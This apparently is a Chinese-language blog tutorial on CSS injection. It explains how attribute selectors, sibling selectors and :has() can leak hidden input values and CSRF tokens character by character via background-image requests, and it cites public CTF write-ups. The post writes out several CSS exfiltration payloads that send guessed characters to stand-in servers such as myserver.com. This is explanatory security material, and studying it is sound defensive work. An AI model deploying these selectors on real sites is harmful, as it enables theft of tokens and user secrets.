---
title: "CSS INJECTION"
description: "CSS 提供了一些选择器，可以选中具有特定属性值的 HTML 元素。以下是介绍的几种属性选择器："
publishDate: "2026-01-25T10:23:39+08:00"
ogImage: "https://s3.bmp.ovh/2026/02/05/Eiykxvb9.png"
categories: ["Vulnerability Research"]
tags: ["css", "注入"]
---
## **CSS 属性选择器**

CSS 提供了一些选择器，可以选中具有特定属性值的 HTML 元素。以下是介绍的几种属性选择器：

- `input[value^="a"]`: 选择 `value` 属性以 `a` 开头的 `input` 元素。
- `input[value$="a"]`: 选择 `value` 属性以 `a` 结尾的 `input` 元素。
- `input[value*="a"]`: 选择 `value` 属性包含 `a` 的 `input` 元素。

## **利用 CSS 发送请求**

通过某些 CSS 规则，可以触发浏览器向特定服务器发送请求。例如，通过设置某个元素的背景图片可以发起请求，背景图片的 URL 可以包含有用的数据（如输入字段的值）。

1. **数据窃取的示例**

假设存在一个具有隐藏 `input` 的表单：

```html
<input name="secret" value="abc123">
```

您可以使用以下 CSS 规则来窃取 `input` 元素的第一个字符：

```css

input[name="secret"][value^="a"] {
  background: url(https://myserver.com?q=a);
}
```

如果 `input` 的 `value` 以 `a` 开头，则该规则将应用，并触发请求到服务器，泄露了输入的第一个字符。

1. **窃取更复杂的值**

要窃取更复杂的数据（例如 CSRF token），可以考虑以下方法：

### 2.1 隐藏的输入元素

对于隐藏的 `input` 元素（如 CSRF token），直接的 CSS 选择器可能无法触发请求，因为它们不会显示在页面上。比如：

```html
<input type="hidden" name="csrf-token" value="abc123">
```

### **2.2 选择后面的元素**

可以利用相邻选择器（`+`）来达到目的。例如，选择匹配元素后面的一个可见元素：

```css
input[name="csrf-token"][value^="a"] + **input** {
  background: url(https://example.com?q=a);
}
```

这条规则会选择紧跟在满足条件的 `input` 后面的可见 `input`，从而触发浏览器加载背景图片，间接获取隐藏 `input` 的值。

### **2.3 处理没有后续元素的情况**

```
html:has(meta[name="csrf-token"][content^="a"]) {
  background: url(https://example.com?q=a);
}
```

**解读：**

1. **选择器部分 ****html:has(meta[name="csrf-token"][content^="a"])**：
   - 这是一个针对 `<html>` 标签的选择器。
   - 它使用 `:has()` 内部包含了一个条件：`meta[name="csrf-token"][content^="a"]`。
   - 整个选择器的意思是：**“选择出这样一个 ****<html>**** 元素：它内部某处包含着一个 ****<meta>**** 标签，且这个 ****<meta>**** 标签的 ****name**** 属性是 ****csrf-token****，并且它的 ****content**** 属性的值以字母 ****a**** 开头。”**

## **利用 CSS 选择器窃取****<meta>****数据**

```
<meta name="csrf-token" content="abc123">
```

由于 `<meta>` 标签通常是不可见的，因此需要特殊的处理来窃取其中的内容。

#### **3.1** **:has()** **选择器**

可以使用 CSS 选择器 `:has()` 来直接验证 `<meta>` 标签的内容。例如，以下规则会检测到 `content` 属性以 `a` 开头的 CSRF token，并向指定的 URL 发送请求：

```
html:has(meta[name="csrf-token"][content^="a"]) {
  background: url(https://example.com?q=a);
}
```

#### **3.2 将** **<meta>** **标签变为可见**

虽然 `<meta>` 标签本身不可见，但与隐藏输入不同的是，可以通过 CSS 将其设置为可见。例如，通过以下规则：

```
meta {
  display: block;  
}
```

但仅仅这样仍然不够，因为 `<meta>` 元素位于 `<head>` 中，而 `<head>` 标签默认的 `display: none` 属性会导致 `<meta>` 依然不可见。因此，需要特别设置 `<head>` 的显示属性：

```
head, meta {
  display: block;  
}
```

这样一来，浏览器将能处理 `<meta>` 标签，从而触发请求。

如果希望在页面上显示 `<meta>` 标签中的 `content` 值，可以使用伪元素和 `attr()` 函数。例如：

```
meta:before {
    content: attr(content);
}
```

这将使得 `<meta>` 标签中的 `content` 值在页面上显示。

`iframe`。

`iframe` 可以在当前页面里嵌入另一个完整的页面

## REFERENCE

[https://aszx87410.github.io/beyond-xss/ch3/css-injection/](https://aszx87410.github.io/beyond-xss/ch3/css-injection/)

https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/#dom-clobbering

[https://aszx87410.github.io/beyond-xss/ch3/css-injection-2/](https://aszx87410.github.io/beyond-xss/ch3/css-injection-2/)

[https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/](https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/)

## corCTF 2022  modernblog

https://viblo.asia/p/corctf-2022-writeup-part-2-WAyK8q6kZxX#_advanced-dom-clobbering-3

https://viblo.asia/p/corctf-2022-writeup-part-2-WAyK8q6kZxX#_advanced-dom-clobbering-3

